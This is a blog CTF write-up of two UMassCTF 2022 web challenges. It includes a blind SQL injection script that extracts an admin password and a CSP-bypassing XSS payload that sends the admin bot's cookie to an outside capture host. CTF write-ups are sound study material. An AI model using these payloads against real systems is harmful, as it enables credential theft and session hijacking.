<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="UMassCTF 2022" /><meta name="author" content="HoangND" /><meta property="og:locale" content="en" /><meta name="description" content="I haven’t released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something." /><meta property="og:description" content="I haven’t released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something." /><link rel="canonical" href="https://hnd3884.github.io/posts/UMassCTF-2022/" /><meta property="og:url" content="https://hnd3884.github.io/posts/UMassCTF-2022/" /><meta property="og:site_name" content="HoangND" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-03T00:00:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="UMassCTF 2022" /><meta name="twitter:site" content="@svcrps38" /><meta name="twitter:creator" content="@HoangND" /><meta name="google-site-verification" content="TfvZ9qjq-FON4dsURjq-_zTPDu1wLUj3bMCMmf-atHU" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"HoangND"},"dateModified":"2022-04-04T00:30:35+07:00","datePublished":"2022-04-03T00:00:00+07:00","description":"I haven’t released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something.","headline":"UMassCTF 2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://hnd3884.github.io/posts/UMassCTF-2022/"},"url":"https://hnd3884.github.io/posts/UMassCTF-2022/"}</script><title>UMassCTF 2022 | HoangND</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="HoangND"><meta name="application-name" content="HoangND"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">HoangND</a></div><div class="site-subtitle font-italic">Intern at Viettel Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/hnd3884" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/svcrps38" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['hoangt2k24','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/hoang-nguyen-dinh-40b01b155/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>UMassCTF 2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>UMassCTF 2022</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/svcrps38">Dinh Hoang</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648918800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-03 </em> </span> <span> Updated <em class="timeago" data-ts="1649007035" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-04 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="748 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p>I haven’t released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something.</p><h1 id="venting">Venting</h1><p><img data-src="https://user-images.githubusercontent.com/61985236/161438032-f27b69b3-95c2-4fb2-9edf-2c390c2dc73b.png" alt="image" data-proofer-ignore></p><p>After tried web features, the proxy history showed me 1 interest endpoint.</p><p><img data-src="https://user-images.githubusercontent.com/61985236/161438156-c058349d-729f-497d-936e-1cde76e9243b.png" alt="image" data-proofer-ignore></p><p>Just change admin=True and we will get admin login page. Trying put ‘ in an textbox give me that this is sql injection challenge.</p><p>I tried dumped admin’s password by the following script and get the flag.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">passwd</span> <span class="o">=</span> <span class="s">''</span>
    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">127</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">basepl</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"user"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
            <span class="s">"pass"</span><span class="p">:</span> <span class="s">"1' or (SELECT hex(substr(password,{},1)) FROM users WHERE+username='admin') &gt; hex('{}') and 'a'='a"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
            <span class="s">'http://34.148.103.218:4446/fff5bf676ba8796f0c51033403b35311/login'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">basepl</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="c1"># print(c+'  :  '+str(len(res.text)))
</span>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">==</span> <span class="mi">113</span><span class="p">:</span>
            <span class="n">passwd</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="k">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>

</pre></table></code></div></div><h1 id="umassdining">Umassdining</h1><p><img data-src="https://user-images.githubusercontent.com/61985236/161434067-5c5d653a-9c04-43e4-810d-71f0c92c829d.png" alt="image" data-proofer-ignore></p><p>The source code is given in the challenge’s description but I checked web features first. The web navigation shows us 3 options: Home, Register, Join. Register is basically for registration, after fill the form we got the message ‘We got your request and will read it shortly!’. Join navigation is maybe administrator feature because the message ‘You’re not allowed here!’ appeared. Next we audit the source code. This web has the following 3 main endpoint</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/register"</span><span class="p">,</span><span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s">'GET'</span><span class="p">,</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_register</span><span class="p">():</span>
    <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">'GET'</span><span class="p">):</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s">'register.html'</span><span class="p">))</span>
        <span class="n">add_resp_headers</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">check_for_cookie</span><span class="p">()</span><span class="o">==</span><span class="bp">False</span><span class="p">):</span>
            <span class="n">response</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"auth"</span><span class="p">,</span><span class="s">"-1"</span><span class="p">,</span><span class="n">secure</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">samesite</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">'POST'</span><span class="p">):</span> 
        <span class="k">if</span><span class="p">(</span><span class="n">active_count</span><span class="p">()</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">):</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">to_dict</span><span class="p">()</span>
            <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">bot</span><span class="p">.</span><span class="n">checkEssay</span><span class="p">,</span><span class="n">kwargs</span><span class="o">=</span><span class="p">{</span><span class="s">'data'</span><span class="p">:</span><span class="n">data</span><span class="p">})</span>
            <span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
            <span class="k">return</span> <span class="s">"We got your request and will read it shortly!"</span><span class="p">,</span><span class="mi">200</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="s">"We are busy right now, try again in a second"</span><span class="p">,</span><span class="mi">200</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/review/essay"</span><span class="p">,</span><span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s">'GET'</span><span class="p">,</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">reviewEssay</span><span class="p">():</span>
    <span class="n">essay</span> <span class="o">=</span> <span class="p">{</span><span class="s">"email"</span><span class="p">:</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"name"</span><span class="p">),</span><span class="s">"essay"</span><span class="p">:</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"essay"</span><span class="p">)}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s">'essay_checker.html'</span><span class="p">,</span><span class="n">essay</span><span class="o">=</span><span class="n">essay</span><span class="p">))</span>
    <span class="n">add_resp_headers</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s">'127.0.0.1'</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">"Sorry pal you</span><span class="se">\'</span><span class="s">re not admin"</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">response</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">'no essays to read'</span><span class="p">,</span><span class="mi">200</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/join"</span><span class="p">,</span><span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">get_play</span><span class="p">():</span>
    <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"auth"</span><span class="p">)</span><span class="o">==</span><span class="n">admin_cookie</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">"TEST{not_the_real_flag}"</span><span class="p">,</span><span class="mi">200</span>
    <span class="k">return</span> <span class="s">"You're not allowed here!"</span><span class="p">,</span><span class="mi">403</span>
</pre></table></code></div></div><p>Endpoint /join checks auth cookie and only returns flag if it is admin cookie. I need to get the admin token by somehow. /register forwards request data to bot.checkEssay</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">checkEssay</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">opts</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
    <span class="n">opts</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--headless"</span><span class="p">)</span>
    <span class="n">driver</span> <span class="o">=</span> <span class="n">Firefox</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="s">'/usr/bin/geckodriver'</span><span class="p">,</span><span class="n">options</span><span class="o">=</span><span class="n">opts</span><span class="p">)</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">set_window_size</span><span class="p">(</span><span class="mi">320</span><span class="p">,</span> <span class="mi">240</span><span class="p">)</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">set_page_load_timeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1:8000/'</span><span class="p">)</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">add_cookie</span><span class="p">({</span><span class="s">"name"</span><span class="p">:</span><span class="s">"auth"</span><span class="p">,</span><span class="s">"value"</span><span class="p">:</span><span class="n">admin_cookie</span><span class="p">})</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://127.0.0.1:8000/review/essay?email={a}&amp;essay={b}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s">'email'</span><span class="p">],</span><span class="n">b</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="s">'essay'</span><span class="p">]))</span>    
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">driver</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
</pre></table></code></div></div><p>The above section takes data from register endpoint, add admin’s cookie to cookie and make request to the last of 3 endpoints - /review/essay, maybe i could leak the cookie from this. Look /review/essay handler</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">reviewEssay</span><span class="p">():</span>
    <span class="n">essay</span> <span class="o">=</span> <span class="p">{</span><span class="s">"email"</span><span class="p">:</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"name"</span><span class="p">),</span><span class="s">"essay"</span><span class="p">:</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"essay"</span><span class="p">)}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s">'essay_checker.html'</span><span class="p">,</span><span class="n">essay</span><span class="o">=</span><span class="n">essay</span><span class="p">))</span>
    <span class="n">add_resp_headers</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">!=</span> <span class="s">'127.0.0.1'</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">"Sorry pal you</span><span class="se">\'</span><span class="s">re not admin"</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">response</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">'no essays to read'</span><span class="p">,</span><span class="mi">200</span>
</pre></table></code></div></div><p>Check the essay_checker template returned by the above handler</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Admin Essay Review<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span> 
        Essay Review Panel
    <span class="nt">&lt;/h1&gt;&lt;br&gt;</span>
    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;main&gt;</span>
            Essay<span class="nt">&lt;br&gt;</span> 
            <span class="nt">&lt;br&gt;</span>
            Author<span class="nt">&lt;br&gt;</span>
            <span class="nt">&lt;br&gt;</span>
        <span class="nt">&lt;/main&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>The jinja2’s safe filter is used in essay property of essay object. The safe filter basically disables html-escape in the expression passed through it while rendering html page. It’s maybe vulnerable to XSS exploit and i can make outbound request to get admin’s cookie. I tried some basic payload but it didn’t work, my outbound server didn’t get any requests. The reason is the following</p><p><img data-src="https://user-images.githubusercontent.com/61985236/161436404-6ad54892-f973-4b15-8e6a-f7b945b99f17.png" alt="image" data-proofer-ignore></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">add_resp_headers</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
    <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Security-Policy'</span><span class="p">]</span><span class="o">=</span> <span class="s">"default-src 'self';script-src 'self' 'unsafe-eval'"</span>
</pre></table></code></div></div><p>The above section adds CSP header to response that restrict browser can only load resource from the current origin. It literally means all directly payloads from our essay param won’t work. For more information about CSP, you can read <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">here</a>. I checked static folder and expected there was any usefull javascript file in it. And i saw things.js</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">iloveumass</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">debug</span><span class="dl">"</span><span class="p">).</span><span class="nx">getAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">data-iloveumass</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">function</span> <span class="nx">say_something</span><span class="p">(</span><span class="nx">words</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nx">setTimeout</span><span class="p">(</span><span class="s2">`console.log('</span><span class="p">${</span><span class="nx">words</span><span class="p">}</span><span class="s2">')`</span><span class="p">,</span><span class="mi">500</span><span class="p">)</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOMContentLoaded</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">say_something</span><span class="p">(</span><span class="nx">iloveumass</span><span class="p">)</span>
<span class="p">});</span>
</pre></table></code></div></div><p>This script gets the html element with id ‘debug’, takes ‘data-iloveumass’ attribute from it and passes it to vulnerable setTimeout function call. We can manipulate this file to bypass CSP protection. Final payload is the following</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">id=</span><span class="s">'debug'</span> <span class="na">src=</span><span class="s">"/static/js/thing.js"</span> <span class="na">data-iloveumass=</span><span class="s">"aaa');eval(document.location='http://hoangnd.free.beeceptor.com?cookie='%2bdocument.cookie);console.log('aaa"</span><span class="nt">&gt;&lt;/script&gt;</span>
</pre></table></code></div></div><p>Put it in essay in register form, and an request will be made to your server.</p><p><img data-src="https://user-images.githubusercontent.com/61985236/161437862-27d1340d-9516-4ecc-b6e2-27f02e629e92.png" alt="image" data-proofer-ignore></p><p>Add admin’s cookie to /join endpoint and get flag.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/umassctf-2022/'>UmassCTF 2022</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/dom-xss/" class="post-tag no-text-decoration" >dom xss</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=UMassCTF 2022 - HoangND&amp;url=https://hnd3884.github.io/posts/UMassCTF-2022/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=UMassCTF 2022 - HoangND&amp;u=https://hnd3884.github.io/posts/UMassCTF-2022/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://hnd3884.github.io/posts/UMassCTF-2022/&amp;text=UMassCTF 2022 - HoangND" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/UMassCTF-2022/">UMassCTF 2022</a><li><a href="/posts/cve-2022-22005-microsoft-sharepoint-RCE/">CVE-2022-22005 Microsoft Sharepoint RCE</a><li><a href="/posts/htb-under-construction/">HTB Under 